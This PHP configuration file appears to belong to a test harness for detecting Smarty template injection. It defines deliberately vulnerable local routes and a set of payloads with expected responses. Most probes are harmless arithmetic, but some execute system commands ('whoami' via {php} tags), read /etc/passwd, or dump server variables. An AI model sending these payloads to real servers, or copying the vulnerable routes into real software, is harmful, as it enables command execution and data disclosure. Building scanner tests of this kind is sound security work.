<?php
/**
 * Route configuration for Smarty SSTI test application.
 */

class SmartyRoutes 
{
    const VULNERABLE_ROUTES = [
        'search' => [
            'url' => '/search',
            'methods' => ['GET'],
            'parameters' => ['q'],
            'vulnerability_type' => 'reflected_parameter',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Search query rendered through Smarty template'
        ],
        
        'profile_form' => [
            'url' => '/profile',
            'methods' => ['GET', 'POST'],
            'parameters' => ['name', 'bio', 'signature'],
            'vulnerability_type' => 'form_input',
            'payload_location' => 'form_data',
            'confidence' => 'high',
            'description' => 'Form data rendered through Smarty template'
        ],
        
        'direct_render' => [
            'url' => '/render',
            'methods' => ['GET'],
            'parameters' => ['content', 'type'],
            'vulnerability_type' => 'template_injection',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Dynamic Smarty template creation from user input'
        ],
        
        'debug_page' => [
            'url' => '/debug',
            'methods' => ['GET'],
            'parameters' => ['info', 'level'],
            'vulnerability_type' => 'debug_information',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Debug information with server variables access'
        ],
        
        'api_calculator' => [
            'url' => '/api/calc',
            'methods' => ['GET'],
            'parameters' => ['expr', 'format'],
            'vulnerability_type' => 'math_expression',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Math expression evaluation through Smarty'
        ],
        
        'math_test' => [
            'url' => '/math',
            'methods' => ['GET'],
            'parameters' => ['eq'],
            'vulnerability_type' => 'math_function',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Direct math function usage with user input'
        ],
        
        'server_info' => [
            'url' => '/server',
            'methods' => ['GET'],
            'parameters' => ['key'],
            'vulnerability_type' => 'server_variables',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Server variables access through $smarty.server'
        ],
        
        'php_execution' => [
            'url' => '/php',
            'methods' => ['GET'],
            'parameters' => ['code'],
            'vulnerability_type' => 'php_execution',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'PHP code execution through {php} tags'
        ],
        
        'custom_function' => [
            'url' => '/custom',
            'methods' => ['GET'],
            'parameters' => ['cmd', 'file', 'action'],
            'vulnerability_type' => 'custom_functions',
            'payload_location' => 'query_parameter',
            'confidence' => 'high',
            'description' => 'Custom Smarty functions for system access'
        ]
    ];
    
    const SAFE_ROUTES = [
        'index' => [
            'url' => '/',
            'methods' => ['GET'],
            'description' => 'Main index page - static content'
        ]
    ];
    
    // Test payloads specific to Smarty
    const SMARTY_TEST_PAYLOADS = [
        'basic_math' => [
            'payload' => '{7*7}',
            'expected_response' => '49',
            'confidence' => 'high',
            'description' => 'Basic mathematical operation'
        ],
        
        'math_function' => [
            'payload' => '{math equation="7*7"}',
            'expected_response' => '49',
            'confidence' => 'high',
            'description' => 'Math function with equation parameter'
        ],
        
        'server_variables' => [
            'payload' => '{$smarty.server.HTTP_HOST}',
            'expected_response' => 'localhost',
            'confidence' => 'high',
            'description' => 'Server variables access'
        ],
        
        'server_dump' => [
            'payload' => '{$smarty.server|@print_r}',
            'expected_response' => 'Array',
            'confidence' => 'high',
            'description' => 'Complete server variables dump'
        ],
        
        'php_execution' => [
            'payload' => '{php}echo "test";{/php}',
            'expected_response' => 'test',
            'confidence' => 'high',
            'description' => 'PHP code execution through php tags'
        ],
        
        'php_info' => [
            'payload' => '{php}phpinfo();{/php}',
            'expected_response' => 'PHP Version',
            'confidence' => 'high',
            'description' => 'PHP information disclosure'
        ],
        
        'constants_access' => [
            'payload' => '{$smarty.const.PHP_VERSION}',
            'expected_response' => '.',
            'confidence' => 'medium',
            'description' => 'PHP constants access'
        ],
        
        'timestamp_access' => [
            'payload' => '{$smarty.now}',
            'expected_response' => '16',
            'confidence' => 'medium',
            'description' => 'Current timestamp access'
        ],
        
        'upper_modifier' => [
            'payload' => '{"test"|upper}',
            'expected_response' => 'TEST',
            'confidence' => 'medium',
            'description' => 'String uppercase modifier'
        ],
        
        'count_characters' => [
            'payload' => '{"test"|count_characters}',
            'expected_response' => '4',
            'confidence' => 'medium',
            'description' => 'Character count modifier'
        ],
        
        'date_format' => [
            'payload' => '{$smarty.now|date_format:"%Y"}',
            'expected_response' => '20',
            'confidence' => 'medium',
            'description' => 'Date formatting function'
        ],
        
        'system_function' => [
            'payload' => '{system_exec command="whoami"}',
            'expected_response' => 'www-data',
            'confidence' => 'high',
            'description' => 'Custom system execution function'
        ],
        
        'file_read' => [
            'payload' => '{file_read file="/etc/passwd"}',
            'expected_response' => 'root:',
            'confidence' => 'high',
            'description' => 'Custom file reading function'
        ],
        
        'escape_modifier' => [
            'payload' => '{"<script>"|escape}',
            'expected_response' => '&lt;script&gt;',
            'confidence' => 'low',
            'description' => 'HTML escape modifier (safe)'
        ]
    ];
    
    // Context-specific payloads for Smarty
    const CONTEXT_PAYLOADS = [
        'html_context' => [
            '{7*7}',
            '{math equation="7*7"}',
            '{$smarty.server.HTTP_HOST}'
        ],
        
        'url_parameter' => [
            '%7B7*7%7D',  // URL encoded {7*7}
            '{7*7}',
            '{$smarty.server.REQUEST_URI}'
        ],
        
        'form_data' => [
            '{7*7}',
            '{php}echo "test";{/php}',
            '{$smarty.server|@print_r}'
        ],
        
        'json_context' => [
            '{7*7}',
            '{math equation="7*7"}'
        ],
        
        'math_context' => [
            '{math equation="7*7"}',
            '{math equation="x*y" x=7 y=7}',
            '{math equation="sqrt(49)"}'
        ],
        
        'php_context' => [
            '{php}echo 7*7;{/php}',
            '{php}phpinfo();{/php}',
            '{php}system("whoami");{/php}'
        ]
    ];
    
    // Expected error patterns for Smarty
    const SMARTY_ERROR_PATTERNS = [
        'Smarty\\Exception',
        'SmartyException',
        'Smarty_Exception',
        'syntax error',
        'unrecognized tag',
        'unknown modifier',
        'unknown function'
    ];
    
    // Smarty-specific indicators
    const SMARTY_INDICATORS = [
        'Smarty',
        '{$smarty.',
        '{php}',
        '{math',
        'templates_c',
        'Smarty_Internal'
    ];
    
    // Test configuration
    const TEST_CONFIG = [
        'app_name' => 'smarty',
        'host' => 'localhost',
        'port' => 8081,
        'base_url' => 'http://localhost:8081',
        'startup_timeout' => 10,
        'request_timeout' => 5,
        'expected_engine' => 'smarty',
        'framework' => 'smarty',
        'language' => 'php'
    ];
}
?>
